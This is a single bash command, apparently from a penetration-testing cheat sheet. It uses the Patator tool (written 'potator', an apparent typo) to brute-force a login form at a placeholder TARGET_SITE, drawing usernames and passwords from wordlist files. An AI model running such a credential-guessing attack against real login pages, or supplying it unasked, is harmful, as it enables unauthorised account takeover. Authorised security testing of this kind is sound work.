```bash
potator http_fuzz url=http://TARGET_SITE/login.php method=POST body='username=FILE0&password=FILE1' 0=/path/to/usernamefile.lst 1=/path/to/file/name/of/passwords.lst
```